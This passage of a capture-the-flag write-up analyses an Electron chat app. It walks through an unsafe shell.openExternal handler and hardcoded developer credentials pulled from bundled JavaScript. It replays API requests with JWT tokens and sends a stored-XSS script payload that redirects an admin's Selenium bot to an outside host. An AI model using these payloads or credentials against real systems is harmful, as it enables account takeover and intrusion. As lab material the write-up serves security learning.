</span><span class="code-line">-rwxr-xr-x  <span class="token number">1</span> hcue hcue  <span class="token number">783</span> Dec  <span class="token number">5</span> 04:58 preload.js
</span><span class="code-line">drwxr-xr-x  <span class="token number">3</span> hcue hcue <span class="token number">4096</span> Dec  <span class="token number">5</span> 04:58 src
</span><span class="code-line">drwxr-xr-x  <span class="token number">2</span> hcue hcue <span class="token number">4096</span> Dec  <span class="token number">5</span> 04:58 static
</span><span class="code-line">-rwxr-xr-x  <span class="token number">1</span> hcue hcue <span class="token number">1029</span> Dec  <span class="token number">5</span> 04:58 webpack.common.js
</span></code></pre></div>
<p>Checking the <code>index.js</code> file, we can notice an interesting function that is being called:</p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line">ipcMain<span class="token punctuation">.</span><span class="token method function property-access">on</span><span class="token punctuation">(</span><span class="token string">&#x27;handle-links&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span> task<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>task <span class="token operator">===</span> <span class="token string">&#x27;download&#x27;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token keyword">const</span> downloadPath <span class="token operator">=</span> <span class="token string">&#x27;/opt/userland/&#x27;</span>
</span><span class="code-line">    <span class="token keyword">const</span> filename <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token method function property-access">split</span><span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">const</span> filepath <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>downloadPath<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>filename<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
</span><span class="code-line">
</span><span class="code-line">    fs<span class="token punctuation">.</span><span class="token method function property-access">access</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> fs<span class="token punctuation">.</span><span class="token constant">F_OK</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">      <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">        <span class="token keyword control-flow">await</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token maybe-class-name">BrowserWindow</span><span class="token punctuation">.</span><span class="token method function property-access">getFocusedWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">directory</span><span class="token operator">:</span> downloadPath <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line">        win<span class="token punctuation">.</span><span class="token property-access">webContents</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&#x27;file-downloaded&#x27;</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">File Imported at: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>downloadPath<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>filename<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword control-flow">return</span>
</span><span class="code-line">      <span class="token punctuation">}</span>
</span><span class="code-line">
</span><span class="code-line">      win<span class="token punctuation">.</span><span class="token property-access">webContents</span><span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token string">&#x27;file-downloaded&#x27;</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">File Already Exists At: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>downloadPath<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>filename<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token punctuation">}</span> <span class="token keyword control-flow">else</span> <span class="token punctuation">{</span>
</span><span class="code-line">    shell<span class="token punctuation">.</span><span class="token method function property-access">openExternal</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token punctuation">}</span>
</span><span class="code-line"><span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>The code listens for an <code>handle-links</code> event on the <code>ipcMain</code> module, which is used to communicate between the main process and renderer processes in Electron.
When the <code>handle-links</code> event is received, the code checks the value of the <code>task</code> argument to determine the desired action. If the <code>task</code> argument is <code>download</code>, the code extracts the filename from the <code>url</code>. And here comes the interesting part, where urls are passed to the <code>shell.openExternal</code> function which allows this application to open a URL in the web browser. Researching about this function we see that it can allow us to execute arbitrary code on the user’s system. Another possibility is that if we have control over the <code>filename</code> variable, we will eventually have file overwrite while traversing the directory.</p>
<p>We’ll get back to this later, once we understand how this application works.</p>
<p>In the <code>src/js</code> folder, we have <code>app.js</code> which seems to be packed. Without cleaning it, we can notice that’s it talking with an API where it takes the URL from <code>config.json</code> which seems missing from the source.</p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line">_config_json__WEBPACK_IMPORTED_MODULE_1__<span class="token punctuation">.</span><span class="token constant">BACKEND_URL</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line"><span class="token comment">/* harmony import */</span> <span class="token keyword">var</span> _config_json__WEBPACK_IMPORTED_MODULE_1__ <span class="token operator">=</span> <span class="token function">__webpack_require__</span><span class="token punctuation">(</span>
</span><span class="code-line">  <span class="token comment">/*! ./config.json */</span> <span class="token string">&#x27;./src/js/config.json&#x27;</span>
</span><span class="code-line"><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Since we knew/assumed that we have an API running on port 9000, <code>BACKEND_URL</code> should be <code>http://10.129.228.64:9000</code>. Reading much further, we can see an API call to <code>/api/login</code> where we find credentials for the <code>developer</code> user.</p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>_config_json__WEBPACK_IMPORTED_MODULE_1__<span class="token punctuation">.</span><span class="token constant">BACKEND_URL</span><span class="token punctuation">,</span> <span class="token string">&#x27;/api/login&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#x27;POST&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token literal-property property">Accept</span><span class="token operator">:</span> <span class="token string">&#x27;application/json&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">    <span class="token string-property property">&#x27;Content-Type&#x27;</span><span class="token operator">:</span> <span class="token string">&#x27;application/json&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token known-class-name class-name">JSON</span><span class="token punctuation">.</span><span class="token method function property-access">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&#x27;developer&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">    <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">&#x27;5up3rd3vl0per!!&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line"><span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token property-access">status</span> <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">      <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">setItem</span><span class="token punctuation">(</span><span class="token string">&#x27;token&#x27;</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token property-access">token</span><span class="token punctuation">)</span>
</span><span class="code-line">      <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">setItem</span><span class="token punctuation">(</span><span class="token string">&#x27;username&#x27;</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token property-access">username</span><span class="token punctuation">)</span>
</span><span class="code-line">      <span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token punctuation">}</span>
</span><span class="code-line">  <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>I tried using the API that we have to confirm that it’s talking with it. And it works!</p>
<div class="relative"><pre><code class="language-http code-highlight"><span class="code-line"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json; charset=utf-8</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">207</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sat, 03 Dec 2022 09:15:30 GMT</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</span><span class="code-line">
</span><span class="code-line">{&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA1ODkzMCwiZXhwIjoxNjcwMDgwNTMwfQ.TCk_Ixejig808W5BainV05u5hmFlE65U0knzjvSIdwI&quot;,&quot;status&quot;:200,&quot;username&quot;:&quot;developer&quot;}
</span></code></pre></div>
<p>We can see multiple endpoints including <code>/api/chats/allChats</code></p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>_config_json__WEBPACK_IMPORTED_MODULE_1__<span class="token punctuation">.</span><span class="token constant">BACKEND_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;/api/chats/allChats&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
</span><span class="code-line">              <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#x27;GET&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">              <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
</span><span class="code-line">                <span class="token literal-property property">token</span><span class="token operator">:</span> <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">&#x27;token&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">              <span class="token punctuation">}</span>
</span><span class="code-line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">              <span class="token keyword control-flow">return</span> data<span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token parameter">chats</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">              <span class="token function">setallMessages</span><span class="token punctuation">(</span>chats<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">          <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre></div>
<p>I tried fetching it using the token I retrieved from the login.</p>
<div class="relative"><pre><code class="language-http code-highlight"><span class="code-line"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json; charset=utf-8</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1812</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sat, 03 Dec 2022 09:20:29 GMT</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</span><span class="code-line">
</span><span class="code-line">[{&quot;id&quot;:1,&quot;sender&quot;:&quot;admin&quot;,&quot;receiver&quot;:&quot;developer&quot;,&quot;message&quot;:&quot;Hey!&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:2,&quot;sender&quot;:&quot;developer&quot;,&quot;receiver&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;Hey!!&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:3,&quot;sender&quot;:&quot;developer&quot;,&quot;receiver&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;You are using the admin account on the server itself right?&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:4,&quot;sender&quot;:&quot;admin&quot;,&quot;receiver&quot;:&quot;developer&quot;,&quot;message&quot;:&quot;Yes&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:5,&quot;sender&quot;:&quot;developer&quot;,&quot;receiver&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;Well thats good make sure to use the admin account on the server.&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:6,&quot;sender&quot;:&quot;admin&quot;,&quot;receiver&quot;:&quot;developer&quot;,&quot;message&quot;:&quot;Yes I know you did explained me why I should use it only on server.&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:7,&quot;sender&quot;:&quot;developer&quot;,&quot;receiver&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;Nice.&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:8,&quot;sender&quot;:&quot;admin&quot;,&quot;receiver&quot;:&quot;developer&quot;,&quot;message&quot;:&quot;The service checkup script that you created is not working anymore with the selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;false&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:9,&quot;sender&quot;:&quot;developer&quot;,&quot;receiver&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;Yeah Sure&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;true&quot;,&quot;type&quot;:&quot;message&quot;},{&quot;id&quot;:10,&quot;sender&quot;:&quot;tbug&quot;,&quot;receiver&quot;:&quot;developer&quot;,&quot;message&quot;:&quot;Why userland city market place is not working for me?&quot;,&quot;timestamp&quot;:&quot;2022-12-03 08:42:27&quot;,&quot;lastMessage&quot;:&quot;true&quot;,&quot;type&quot;:&quot;message&quot;}]
</span></code></pre></div>
<p>The only interesting message was this:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">The service checkup script that you created is not working anymore with the Selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?
</span></code></pre></div>
<p>For the time being, this may be irrelevant until we check the other endpoints.</p>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>_config_json__WEBPACK_IMPORTED_MODULE_1__<span class="token punctuation">.</span><span class="token constant">BACKEND_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;/api/chats/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>currentChat<span class="token punctuation">,</span> <span class="token string">&quot;/add&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
</span><span class="code-line">                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#x27;POST&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">                <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
</span><span class="code-line">                  <span class="token string-property property">&#x27;Accept&#x27;</span><span class="token operator">:</span> <span class="token string">&#x27;application/json&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">                  <span class="token string-property property">&#x27;Content-Type&#x27;</span><span class="token operator">:</span> <span class="token string">&#x27;application/json&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">                  <span class="token string-property property">&#x27;token&#x27;</span><span class="token operator">:</span> <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">&#x27;token&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">                <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-js code-highlight"><span class="code-line"><span class="token keyword">var</span> <span class="token function-variable function">uploadFile</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line">            <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">            formData<span class="token punctuation">.</span><span class="token method function property-access">append</span><span class="token punctuation">(</span><span class="token string">&#x27;uploadedFile&#x27;</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token property-access">target</span><span class="token punctuation">.</span><span class="token property-access">files</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>_config_json__WEBPACK_IMPORTED_MODULE_1__<span class="token punctuation">.</span><span class="token constant">BACKEND_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;/api/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">concat</span><span class="token punctuation">(</span>currentChat<span class="token punctuation">,</span> <span class="token string">&quot;/upload&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
</span><span class="code-line">              <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#x27;POST&#x27;</span><span class="token punctuation">,</span>
</span><span class="code-line">              <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span>
</span><span class="code-line">                <span class="token string-property property">&#x27;token&#x27;</span><span class="token operator">:</span> <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">&#x27;token&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">              <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line">              <span class="token literal-property property">body</span><span class="token operator">:</span> formData
</span><span class="code-line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
</span></code></pre></div>
<p>And now we have a way to interact with users by sending them files and messages!</p>
<p>Now, let’s get back to the message that we got earlier, where the users were talking about a Selenium script. Selenium allows you to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application. We can assume now that we will have to trick the bot into downloading our files or interacting with our messages!</p>
<p>Here’s an example on how we can use both <code>/add</code> and <code>/upload</code> API to download/add files/messages:</p>
<div class="relative"><pre><code class="language-http code-highlight"><span class="code-line"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>api<span class="token path-separator">/</span>chats<span class="token path-separator">/</span>admin<span class="token path-separator">/</span>add</span></span> <span class="token http-version property">HTTP/1.1</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">10.129.255.120:9000</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">token</span><span class="token punctuation">:</span><span class="token header-value">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">62</span></span>
</span><span class="code-line"><span class="token application-json">
</span></span><span class="code-line"><span class="token application-json"><span class="token punctuation">{</span><span class="token property">&quot;message&quot;</span><span class="token operator">:</span><span class="token string">&quot;&lt;script&gt;document.location=&quot;</span>http<span class="token operator">:</span><span class="token comment">//10.10.10.10/jaja&quot;&lt;/script&gt;&quot;}</span>
</span></span></code></pre></div>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">POST /api/admin/upload HTTP/1.1
</span><span class="code-line">Host: <span class="token number">10.129</span>.255.120:9000
</span><span class="code-line">User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/107.0.0.0 Safari/537.36
</span><span class="code-line">Accept-Encoding: gzip, deflate
</span><span class="code-line">Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
</span><span class="code-line">Connection: close
</span><span class="code-line">Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>
</span><span class="code-line">token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs
</span><span class="code-line">Upgrade-Insecure-Requests: <span class="token number">1</span>
</span><span class="code-line">Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
</span><span class="code-line">Content-Length: <span class="token number">247</span>
</span><span class="code-line">Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>02427ffc75ddf91f43eb19151c610654
</span><span class="code-line">
</span><span class="code-line">--02427ffc75ddf91f43eb19151c610654
</span><span class="code-line">Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;uploadedFile&quot;</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">&quot;testfile&quot;</span>
</span><span class="code-line">
</span><span class="code-line">pwned
</span><span class="code-line">
</span><span class="code-line">--02427ffc75ddf91f43eb19151c610654--
</span></code></pre></div>
<h3 id="bonus-part---running-gui-app"><a href="#bonus-part---running-gui-app" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>BONUS PART - Running GUI app</h3>
<blockquote>
<p>This part is not needed to continue exploitation or understand the exploit path.</p>
</blockquote>
<p>So, if we try to open the GUI application. It will keep hanging and that’s because it wasn’t able to reach the API as the <code>config.json</code> file which includes the <code>BACKEND_URL</code> variable is missing. Here we have two options:</p>
<ol>
<li>Create the <code>config.json</code> file with the proper <code>BACKEND_URL</code>, which is the instance ip</li>
<li>The lazy way (Which I used XD) is to change all the <code>_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL</code> to the ip instance.</li>
</ol>
<p><img src="/static/images/stack-the-flags-2022/vscode-replace.png" alt="A screenshot of replacing strings with vscode"/></p>
<p>Another thing to change is the CSP in the <code>index.html</code>. We can either change <code>127.0.0.1</code> to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP:</p>
<p><img src="/static/images/stack-the-flags-2022/html-csp.png" alt="A screenshot that shows the Content Security Policy of the Web page"/></p>
<p>Then we can run the app:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:~/htb/medimelecro/resources » electron extract
</span></code></pre></div>
<p><img src="/static/images/stack-the-flags-2022/app-gui.png" alt="A screenshot of the Electron App GUI"/></p>
<p>We can also see also the previous conversation that we extracted from the web API:</p>
<p><img src="/static/images/stack-the-flags-2022/admin-chat-gui.png" alt="A screenshot of the Admin chat with the developer"/></p>
<h3 id="exploitation-1"><a href="#exploitation-1" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploitation</h3>
<p>To wrap everything we found until now:</p>
<ul>
<li>Usage of shell.openExternal(url) which can lead to XSS -&gt; RCE</li>
<li>We can send messages to the admin user</li>
<li>We can upload messages to the admin user</li>
<li>Messages mentioning the usage of Selenium scripts</li>
</ul>
